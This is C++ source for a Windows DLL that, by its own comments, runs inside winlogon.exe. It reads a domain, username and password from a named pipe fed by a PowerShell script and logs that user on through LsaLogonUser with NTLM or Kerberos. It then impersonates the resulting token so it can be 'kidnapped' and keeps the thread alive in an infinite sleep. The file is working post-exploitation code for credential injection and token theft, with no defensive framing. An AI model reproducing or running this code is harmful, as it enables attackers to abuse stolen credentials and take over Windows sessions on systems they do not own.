// logon.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"

using namespace std;

size_t wcsByteLen( const wchar_t* str );
void InitUnicodeString( UNICODE_STRING& str, const wchar_t* value, BYTE* buffer, size_t& offset );
PVOID CreateKerbLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size);
PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size);
size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID address);
void WriteErrorToPipe(string errorMsg, HANDLE pipe);

extern "C" __declspec( dllexport ) void VoidFunc();


//The entire point of this code is to call LsaLogonUser from within winlogon.exe
extern "C" __declspec( dllexport ) void VoidFunc()
{
	//Open a pipe which will receive data from the PowerShell script.
	HANDLE pipe = CreateFile(L"\\\\.\\pipe\\sqsvc", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (pipe == INVALID_HANDLE_VALUE)
	{
		return;
	}

	const size_t strSize = 257;
	size_t bytesToRead = strSize * sizeof(wchar_t) - sizeof(wchar_t);
	wchar_t* domain = new wchar_t[strSize];
	wchar_t* username = new wchar_t[strSize];
	wchar_t* password = new wchar_t[strSize];
	DWORD bytesRead = 0;

	BOOL success = ReadFile(pipe, domain, bytesToRead, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	domain[bytesRead/2] = '\0';
	bytesRead = 0;

	success = ReadFile(pipe, username, bytesToRead, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	username[bytesRead/2] = '\0';
	bytesRead = 0;

	success = ReadFile(pipe, password, bytesToRead, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	password[bytesRead/2] = '\0';
	bytesRead = 0;

	//Get the logon type from the pipe
	USHORT logonType = 10;
	success = ReadFile(pipe, &logonType, 1, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	bytesRead = 0;

	//Get the authentication package to use. 1 = Msv1_0, 2 = Kerberos
	USHORT authPackageToUse = 0;
	success = ReadFile(pipe, &authPackageToUse, 1, &bytesRead, NULL);
	if (!success)
	{
		return;
	}
	bytesRead = 0;

	/////////////
	//Build the parameters to call LsaLogonUser with
	/////////////

	//Get a handle to LSA
	HANDLE hLSA = NULL;
	NTSTATUS status = LsaConnectUntrusted(&hLSA);
	if (status != 0)
	{
		string errorMsg = "Error calling LsaConnectUntrusted. Error code: " + to_string(status);
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}
	if (hLSA == NULL)
	{
		string errorMsg = "hLSA (LSA handle) is NULL, this shouldn't ever happen.";
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	//Build LsaLogonUser parameters
	LSA_STRING originName = {};
	char originNameStr[] = "";
	originName.Buffer = originNameStr;
	originName.Length = (USHORT)0;
	originName.MaximumLength = 0;

	//Build the authentication package parameter based on the auth package the powershell script specified to use
	//Also get the AuthenticationInformation
	char* authPackageBuf = NULL;
	DWORD authBufferSize = 0;
	PVOID authBuffer = NULL;
	if (authPackageToUse == 1)
	{
		authPackageBuf = MSV1_0_PACKAGE_NAME;
		authBuffer = CreateNtlmLogonStructure(domain, username, password, &authBufferSize);
	}
	else if (authPackageToUse == 2)
	{
		authPackageBuf = MICROSOFT_KERBEROS_NAME_A;
		authBuffer = CreateKerbLogonStructure(domain, username, password, &authBufferSize);
	}
	else
	{
		string errorMsg = "Received an invalid auth package from the named pipe";
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	ULONG authPackage = 0;
	PLSA_STRING authPackageName = new LSA_STRING();
	authPackageName->Buffer = authPackageBuf;
	authPackageName->Length = (USHORT)strlen(authPackageBuf);
	authPackageName->MaximumLength = (USHORT)strlen(authPackageBuf);
	status = LsaLookupAuthenticationPackage(hLSA, authPackageName, &authPackage);
	if (status != 0)
	{
		int winError = LsaNtStatusToWinError(status);
		string errorMsg = "Call to LsaLookupAuthenticationPackage failed. Error code: " + to_string(winError);
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	//Get TokenSource
	HANDLE hProcess = GetCurrentProcess();//todo
	HANDLE procToken = NULL;
	success = OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &procToken);
	if (!success)
	{
		DWORD errorCode = GetLastError();
		string errorMsg = "Call to OpenProcessToken failed. Errorcode: " + to_string(errorCode);
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	TOKEN_SOURCE tokenSource = {};
	DWORD realSize = 0;
	success = GetTokenInformation(procToken, TokenSource, &tokenSource, sizeof(tokenSource), &realSize);
	if (!success)
	{
		string errorMsg = "Call to GetTokenInformation failed.";
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	//Misc out parameters
	PVOID profileBuffer = NULL;
	ULONG profileBufferSize = 0;
	LUID loginId;
	HANDLE token = NULL;
	QUOTA_LIMITS quotaLimits;
	NTSTATUS subStatus = 0;

	//Log on the user
	status = LsaLogonUser(hLSA, 
		&originName, 
		static_cast<SECURITY_LOGON_TYPE>(logonType), 
		authPackage, 
		authBuffer,
		authBufferSize, 
		0, 
		&tokenSource, 
		&profileBuffer,
		&profileBufferSize,
		&loginId,
		&token,
		&quotaLimits,
		&subStatus);

	if (status != 0)
	{
		NTSTATUS winError = LsaNtStatusToWinError(status);
		string errorMsg = "Error calling LsaLogonUser. Error code: " + to_string(winError);
		WriteErrorToPipe(errorMsg, pipe);
		return;
	}

	
	//Impersonate the token with the current thread so it can be kidnapped
	ImpersonateLoggedOnUser(token);

	//Put the thread to sleep so it can be impersonated
	string successMsg = "Logon succeeded, impersonating the token so it can be kidnapped and starting an infinite loop with the thread.";
	WriteErrorToPipe(successMsg, pipe);
	HANDLE permenantSleep = CreateMutex(NULL, false, NULL);
	while(1)
	{
		Sleep(MAXDWORD);
	}

	return;
}


PVOID CreateKerbLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size)
{
	size_t wcharSize = sizeof(wchar_t);

	size_t totalSize = sizeof(KERB_INTERACTIVE_LOGON) + ((lstrlenW(domain) + lstrlenW(username) + lstrlenW(password)) * wcharSize);
	KERB_INTERACTIVE_LOGON* ntlmLogon = (PKERB_INTERACTIVE_LOGON)(new BYTE[totalSize]);
	size_t writeAddress = (UINT_PTR)ntlmLogon + sizeof(KERB_INTERACTIVE_LOGON);

	ntlmLogon->MessageType = KerbInteractiveLogon;
	writeAddress += WriteUnicodeString(domain, &(ntlmLogon->LogonDomainName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(username, &(ntlmLogon->UserName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(password, &(ntlmLogon->Password), (PVOID)writeAddress);

	*size = (DWORD)totalSize; //If the size is bigger than a DWORD, there is a gigantic bug somewhere.
	return ntlmLogon;
}


PVOID CreateNtlmLogonStructure(const wchar_t* domain, const wchar_t* username, const wchar_t* password, DWORD* size)
{
	size_t wcharSize = sizeof(wchar_t);

	size_t totalSize = sizeof(MSV1_0_INTERACTIVE_LOGON) + ((lstrlenW(domain) + lstrlenW(username) + lstrlenW(password)) * wcharSize);
	MSV1_0_INTERACTIVE_LOGON* ntlmLogon = (PMSV1_0_INTERACTIVE_LOGON)(new BYTE[totalSize]);
	size_t writeAddress = (UINT_PTR)ntlmLogon + sizeof(MSV1_0_INTERACTIVE_LOGON);

	ntlmLogon->MessageType = MsV1_0InteractiveLogon;
	writeAddress += WriteUnicodeString(domain, &(ntlmLogon->LogonDomainName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(username, &(ntlmLogon->UserName), (PVOID)writeAddress);
	writeAddress += WriteUnicodeString(password, &(ntlmLogon->Password), (PVOID)writeAddress);

	*size = (DWORD)totalSize; //If the size is bigger than a DWORD, there is a gigantic bug somewhere.
	return ntlmLogon;
}

//Returns the amount of bytes written.
size_t WriteUnicodeString(const wchar_t* str, UNICODE_STRING* uniStr, PVOID address)
{
	size_t size = lstrlenW(str) * sizeof(wchar_t);
	uniStr->Length = (USHORT)size;
	uniStr->MaximumLength = (USHORT)size;
	uniStr->Buffer = (PWSTR)address;
	memcpy(address, str, size);
	return size;
}

void WriteErrorToPipe(string errorMsg, HANDLE pipe)
{
	const char* error = errorMsg.c_str();
	DWORD bytesWritten = 0;
	WriteFile(pipe, error, strlen(error),  &bytesWritten, NULL);
}